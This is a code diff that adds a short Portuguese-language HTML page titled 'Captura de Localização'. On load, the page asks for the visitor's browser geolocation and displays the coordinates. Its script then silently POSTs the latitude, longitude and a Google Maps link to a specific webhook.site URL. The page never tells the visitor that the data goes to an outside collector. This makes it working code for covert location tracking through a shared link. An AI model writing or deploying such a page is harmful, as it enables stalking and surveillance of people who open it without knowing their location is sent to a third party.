@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Captura de Localização</title>
+</head>
+
+<body>
+    <h1>Obtendo sua localização...</h1>
+    <p id="output">Aguardando permissão...</p>
+
+    <script>
+        const output = document.getElementById("output");
+
+        function showLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            const mapa = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            output.innerHTML = `
+        ✅ Localização obtida:<br>
+        Latitude: ${latitude}<br>
+        Longitude: ${longitude}<br>
+        <a href="${mapa}" target="_blank">Ver no Google Maps</a>
+      `;
+
+            // Envio via fetch para webhook.site
+            fetch("https://webhook.site/2644ea87-7205-4c07-9973-4d0e61e9082e", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    latitude,
+                    longitude,
+                    mapa
+                })
+            }).then(() => {
+                console.log("📡 Localização enviada com sucesso.");
+            }).catch((error) => {
+                console.error("❌ Erro ao enviar localização:", error);
+            });
+        }
+
+        function showError(error) {
+            output.innerText = `❌ Erro ao obter localização: ${error.message}`;
+        }
+
+        window.onload = () => {
+            if (!navigator.geolocation) {
+                output.innerText = "❌ Geolocalização não suportada neste navegador.";
+            } else {
+                navigator.geolocation.getCurrentPosition(showLocation, showError);
+            }
+        };
+    </script>
+</body>
+
+</html>
